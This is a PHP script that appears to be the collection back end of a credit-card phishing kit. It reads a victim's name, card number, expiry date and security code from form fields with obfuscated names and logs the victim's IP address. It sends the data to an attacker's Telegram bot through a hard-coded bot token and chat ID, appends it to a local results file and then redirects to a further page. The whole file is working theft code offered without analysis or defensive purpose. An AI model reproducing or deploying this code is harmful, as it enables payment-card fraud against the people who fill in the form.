<?php

session_start();


$_SESSION['lo8687co'] = $_POST['lo8687co'];



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
  
$message  = "NAME:  ".$_POST['nm8676X']."\n";
$message .= "CC:  ".$_POST['lo8687co']."\n";
$message .= "MM:  ".$_POST['ex111x']."/ ";
$message .= "".$_POST['ex222x']."\n";
$message .= "CVNBB:  ".$_POST['net44xa']."\n";
$message .= "Ip              : $ip";

$user_ids=array("-4835287780");
$bot='6130855228:AAGGwu_oeQ3Tk6uTJLP8Dc-0YxXjT9R9pOU';

foreach($user_ids as $user_id) {
	$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
	$data=array('chat_id'=>$user_id,'text'=>$message);
	$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
	$context=stream_context_create($options);
	$result=file_get_contents($url,false,$context);
	}
	$myfile = fopen("rzlt.txt", "a+");
	$txt = $message;
	fwrite($myfile, $txt);
	fclose($myfile);

header("Location: index3.php");

?>